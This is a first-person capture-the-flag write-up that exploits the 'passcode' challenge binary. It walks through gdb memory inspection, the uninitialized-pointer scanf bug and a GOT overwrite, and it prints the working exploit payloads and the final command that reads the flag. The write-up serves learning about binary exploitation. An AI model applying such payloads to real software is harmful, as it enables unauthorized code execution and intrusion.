So as usual first thing is I looked at the code supplied 

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

I looked at the comment `// ha! mommy told me that 32bit is vulnerable to bruteforcing :)` and tried to make since of it since I already had the password.
I decided to ignore it and thought it was a red herring.

First thing I tried was to just run it with the inputs as given to me (I knew it wouldn't work but thought it would foolish to not try it)
```
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : O
Welcome O!
enter passcode1 : 123456
enter passcode2 : 13371337
Segmentation fault (core dumped)
```

Next I tried to dig deeper into the code and understood that it was not writing the input to the address of passcode1 & passcode2 but addressed their values as memory addresses.
```c
        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);
```

So now I wanted to see where I could edit them and maybe write the values that I want them to contain.
The only place I had an input was in the `welcome` function. It was also the obvious place since there was no way it was there for no reason.

I thought that maybe I could overwrite the passcodes using the `name` buffer in the `welcome` function. but I could only overwrite `passcode1` and `passcode2` was out of range.

| var       | addr       | distance from &name |
| --------- | ---------- | ------------------- |
| passcode1 | 0xff81d158 | 96                  |
| passcode2 | 0xff81d15c | 100                 |
| name      | 0xff81d0f8 | 0                   |

I wanted to see if I could really overwrite `passcode1` so I ran the program in gdb with `name` set to `b'A' * 100`

```bash
pwndbg> x/4x $ebp - 0x10
0xffd27788:     0x41414141      0xd008ff00      0x0804c000      0xffd27874
```


I knew that I could overwrite `passcode1`. Now the only question was what should I put in it?
At first I thought putting the address of `passcode2` but then I won't be able to edit `passcode1`.
Then I thought about editing the code to maybe skip the `cmp` so I tested if I could edit that memory chunk using GDB

```bash
 0x8049000  0x804a000 r-xp     1000   1000 passcode
```

I could only read and execute.

I thought about editing the return address but there were two problems with that:
1. I would have to ruin the stack canary and this would stop the program
2. the function did not return if the login failed, it would just run `exit(0)`.

I tested if all the bytes of name are overridden because I thought that maybe I could use name to make the passcodes somehow be equal to that.
I saw that after inputting all of the passcodes and right before the `cmp` I still had 4 bytes of the name untouched.

```bash
pwndbg> x/s 0xff949d68
0xff949d68:     "Hell"
```

But it is also noticeable that the address changed meaning it does not keep the same memory addresses each time so that was not a real option since I did not know in advance the addresses of the variables.
To validate this I ran the program again in GDB and searched for the address of name again.

| run | name address |
| --- | ------------ |
| #1  | 0xff81d0f8   |
| #2  | 0xff949d68   |
| #3  | 0xffdb7208   |

Now I was really stuck and had to figure out another way to know what to put in `passcode1`.
Since I was stuck I started building a mind map to work with a more organized chart of ideas.
You can view the map using [xmind](https://xmind.com) and view the map of this CTF -> [passcode](./Mind%20Maps/passcode.xmind). 
*I recommend viewing this map only if you are interested in the different ideas I had at this point.*

One of the ideas was to inject lines of code. To know if there was a way to do this I opened up pwngdb again and searched for the permissions of the code segment.
```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size Offset File (set vmmap_prefer_relpaths on)
 0x8048000  0x8049000 r--p     1000      0 passcode
 0x8049000  0x804a000 r-xp     1000   1000 passcode
 0x804a000  0x804b000 r--p     1000   2000 passcode
 0x804b000  0x804c000 r--p     1000   2000 passcode
 0x804c000  0x804d000 rw-p     1000   3000 passcode
```
The last memory place is editable. I only had to see what this place points at.
but then I could see that it's not the code segment but it is actually the data segment so I went to see what global variables I had that might be saved in the data segment.

In the data segment there is something called the GOT (Global Offset Table). This contains the reference to the location of functions like `scanf`, `printf` and `fflush`. My idea was to change the reference table to point at the inner block of the if statement.

So first I will give `name` 96 chars of random placeholders and then `4 bytes` of the printf GOT reference addr. Then I can put a reference to the inner block of the if statement in the scanf of `passcode1`.
```bash
pwndbg> search "setregid"
Searching for byte: b'setregid'
passcode        0x8048364 'setregid'
libc.so.6       0xf7d2f7d6 'setregid'
```

| name                     | address   |
| ------------------------ | --------- |
| GOT printf reference     | 0x804c010 |
| Inner If statement block | 0x8048364 |

**Now all that was left to do was to build the payload and run!**

Getting decimal view of the addresses
```python
In [1]: int(0x804c010)
Out[1]: 134529040

In [2]: int(0x8048364)
Out[2]: 134513508
```

I had a problem with the payload that I was messing with for a few hours in total and I could not figure out why it wasn't getting the input to passcode1. passcode1 did have the correct address in it and it did point to the correct place but for some reason it was not accepting the input for the `printf` reference...

The payloads I have tried:
```bash
r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08' + b'\n' + b'\x64\x83\x04\x08')")

r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08\n\x64\x83\x04\x08\n')")

r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08\x64\x83\x04\x08')")

r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08\x64\x83\x04\x08\n')")
```

results for all of the payloads above
```bash
pwndbg> x/x $ebp - 0x10
0xffefdd48:     0x0804c010
pwndbg> x/x 0x0804c010
0x804c010 <printf@got.plt>:     0xf7d91a90
```

Then after consulting with someone I know he told me that the second scanf is expecting a decimal and not a string that I am giving him. so I just needed to modify it to give the actuall decimal number and not bytes

New payload:
```bash
r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08' + b'134513508')")
```

so did again did not work. So after some debugging I remembered that I am jumping to `setregid` function 
```assembly
call setregid
```

this meant that I was not giving it the correct inputs so I opened the disassembly in gdb and found the correct address.

the address that I found was right before the `getegid` call and right after the `puts` call `0x804929e`

```python
In [1]: int(0x804929e)
Out[1]: 134517406
```

Final Run
```bash
passcode@ubuntu:~$ ./passcode < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08' + b'134517406')")
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
[flag🤫]
enter passcode1 : Now I can safely trust you that you have credential :)
```

This challenge was the most difficult challenge that I've done so far. It required paying attention to a lot of small specifics and also if you did not know about the GOT before that is an extra challenge to analyze the data segment on the fly. In conclusion this was a really fun challenge that I learned a lot from and recommend to anyone thinking about doing it to go ahead and just dive in.